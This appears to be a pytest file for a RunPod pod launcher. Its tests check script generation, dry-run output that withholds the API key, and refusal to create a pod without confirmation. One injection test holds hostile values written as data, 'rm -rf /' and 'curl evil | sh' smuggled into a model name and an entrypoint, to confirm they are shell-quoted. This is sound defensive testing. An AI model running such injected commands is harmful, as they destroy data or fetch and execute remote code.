# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 tomyimkc
"""Focus-frontier RunPod launcher — no-cost paths only (arg parsing, remote script, payload).

Never creates a pod: only the pure, offline-safe surface is exercised.
"""
from __future__ import annotations

import json

from tools import runpod_focus_frontier as L


def test_offline_remote_script_runs_harness_not_a_fake_eval():
    args = L.parse_args(["--remote-mode", "offline"])
    script = L._remote_focus_script(args)
    assert "tools/run_focus_efficiency_frontier.py --write" in script
    assert "tools/run_focus_efficiency_frontier.py --check" in script
    # offline must not inject any live measured-eval language
    assert "LIVE mode" not in script


def test_live_remote_script_is_honest_about_model_gating():
    args = L.parse_args(["--remote-mode", "live"])
    script = L._remote_focus_script(args)
    assert "LIVE:" in script
    assert "model-gated" in script
    assert "no number is fabricated" in script.lower()
    # still runs the honest harnesses + the 3-arm eval
    assert "run_focus_efficiency_frontier.py --write" in script
    assert "run_focus_frontier_eval.py --write" in script


def test_default_eval_entrypoint_is_the_three_arm_eval():
    args = L.parse_args([])
    assert args.eval_entrypoint == "tools/run_focus_frontier_eval.py"
    script = L._remote_focus_script(L.parse_args(["--remote-mode", "offline"]))
    assert "tools/run_focus_frontier_eval.py --write" in script


def test_live_passes_model_when_supplied():
    import shlex
    model = "Qwen/Qwen2.5-7B-Instruct"
    args = L.parse_args(["--remote-mode", "live", "--model", model])
    script = L._remote_focus_script(args)
    # The model is shell-escaped (shlex.quote), mirroring tools/runpod_rlvr.py.
    assert f"--model {shlex.quote(model)}" in script


def test_dispatch_inputs_are_shell_escaped_no_injection():
    # SECURITY: eval_entrypoint + model are interpolated into a bash script run over SSH;
    # shlex.quote must neutralise shell metacharacters so a malicious dispatch value is a
    # literal argument, never executed.
    evil_model = 'foo"; rm -rf / #'
    evil_entry = "tools/x.py; curl evil | sh"
    args = L.parse_args(["--remote-mode", "live", "--model", evil_model,
                         "--eval-entrypoint", evil_entry])
    script = L._remote_focus_script(args)
    # The raw injection payloads must NOT appear unquoted (they only appear shlex-quoted).
    assert "; rm -rf / #" not in script.replace(__import__("shlex").quote(evil_model), "")
    assert "; curl evil | sh" not in script.replace(__import__("shlex").quote(evil_entry), "")


def test_dry_run_builds_payload_without_secret(capsys):
    rc = L.main(["--dry-run", "--remote-mode", "live"])
    assert rc == 0
    out = capsys.readouterr().out
    assert "RunPod create payload" in out
    # The payload env must NOT carry a RUNPOD_API_KEY *value* (it is popped before print);
    # the dry-run pubkey placeholder proves no real key/pubkey was used.
    assert '"RUNPOD_API_KEY":' not in out
    assert "DRYRUN" in out


def test_refuses_pod_without_yes():
    # No --yes and no --dry-run/--local -> must refuse (exit 2), never create a pod.
    assert L.main(["--remote-mode", "live"]) == 2


def test_local_writes_nogo_report(tmp_path, monkeypatch):
    rc = L.main(["--local", "--remote-mode", "offline"])
    assert rc == 0
    from tools.run_focus_efficiency_frontier import REPORT
    data = json.loads(REPORT.read_text(encoding="utf-8"))
    assert data["verdict"] == "NO-GO"
